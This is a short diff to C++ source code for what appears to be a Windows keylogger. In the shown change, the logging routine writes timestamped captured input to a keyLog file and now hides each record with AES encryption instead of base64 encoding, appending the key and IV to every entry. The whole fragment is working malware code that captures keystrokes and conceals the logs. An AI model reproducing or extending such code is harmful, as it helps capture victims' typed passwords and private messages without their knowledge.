@@ -6,7 +6,7 @@
 #include <fstream>
 #include <Windows.h>
 #include "Auxiliary.h"
-#include "Encoder.h"
+#include "Transformer.h"
 
 using std::cout;
 
@@ -93,7 +93,10 @@ namespace IO
 				outputStream << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << input << std::endl;
 
 				//Encode and saltify that data
-				std::string insertData = Encoder::saltify(Encoder::b64Encode(outputStream.str()));
+				std::string insertData = Transformer::aesEncrypt(outputStream.str());
+
+				insertData +=  "\n\nkey: " + Transformer::getEncryptionKey();
+				insertData += "\niv: " + Transformer::getIV();
 
 				//Write that data into the file
 				keyLog << insertData;
@@ -105,7 +108,9 @@ namespace IO
 			return filePath;
 		}
 		catch(...)
-		{	}
+		{
+			//Do nothing...
+		}
 	}
 }
 
